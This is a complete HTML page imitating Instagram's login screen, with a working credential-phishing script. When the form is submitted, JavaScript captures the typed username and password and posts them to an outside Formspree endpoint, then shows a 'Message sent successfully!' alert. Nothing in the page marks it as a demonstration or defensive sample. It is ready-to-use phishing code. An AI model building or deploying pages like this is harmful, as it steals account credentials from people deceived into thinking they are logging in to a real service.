<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    
</head>
<style>
    body {
    font-family: Arial, sans-serif;
    background-color: #fafafa;
    display: flex;
    justify-content: center;
    align-items: center;
    height: 100vh;
    margin: 0;
}

.container {
    max-width: 350px;
    width: 100%;
}

.login-box {
    background-color: white;
    border: 1px solid #dbdbdb;
    padding: 40px 40px 20px;
    text-align: center;
    margin-bottom: 10px;
}

.logo img {
    margin-bottom: 20px;
}

input {
    width: 100%;
    padding: 10px;
    margin-bottom: 10px;
    border: 1px solid #dbdbdb;
    border-radius: 3px;
    font-size: 14px;
}

button {
    width: 100%;
    padding: 10px;
    background-color: #0095f6;
    color: white;
    border: none;
    border-radius: 3px;
    font-size: 14px;
    font-weight: bold;
    cursor: pointer;
}

button:hover {
    background-color: #007bb5;
}

.divider {
    margin: 20px 0;
    position: relative;
}

.divider::before {
    content: '';
    position: absolute;
    top: 50%;
    left: 0;
    right: 0;
    height: 1px;
    background-color: #dbdbdb;
}

.divider span {
    background-color: white;
    padding: 0 10px;
    color: #8e8e8e;
    font-size: 12px;
}

.facebook-login {
    color: #385185;
    text-decoration: none;
    font-weight: bold;
    display: block;
    margin-bottom: 20px;
}

.forgot-password {
    color: #00376b;
    text-decoration: none;
    font-size: 12px;
}

.signup-box {
    background-color: white;
    border: 1px solid #dbdbdb;
    padding: 20px;
    text-align: center;
}

.signup-box a {
    color: #0095f6;
    text-decoration: none;
    font-weight: bold;
}

.app-links {
    text-align: center;
    margin-top: 20px;
}

.app-links img {
    margin: 0 5px;
}
</style>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo" width="200">
           <form id="myForm">
  <input type="text" id="name" name="name" placeholder="Username,phone number" required>
  <input type="password" id="password" name="password" placeholder="password" required>
  <button type="submit">login</button>
</form>
            <div class="divider">
                <span>OR</span>
            </div>
            <a href="#" class="facebook-login">Log in with Facebook</a>
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        <div class="signup-box">
            <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
        <div class="app-links">
            <p>Get the app.</p>
            <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store" width="120"></a>
            <a href="#"><img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play" width="120"></a>
        </div>
    </div>
<script>
document.getElementById("myForm").addEventListener("submit", async function(event) {
  event.preventDefault();
  
  const formData = {
    name: document.getElementById("name").value,
    email: document.getElementById("password").value
  };

  const response = await fetch("https://formspree.io/f/manddvaw", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(formData)
  });

  if (response.ok) {
    alert("Message sent successfully!");
  } else {
    alert("Something went wrong!");
  }
});
</script>
</body>
</html>
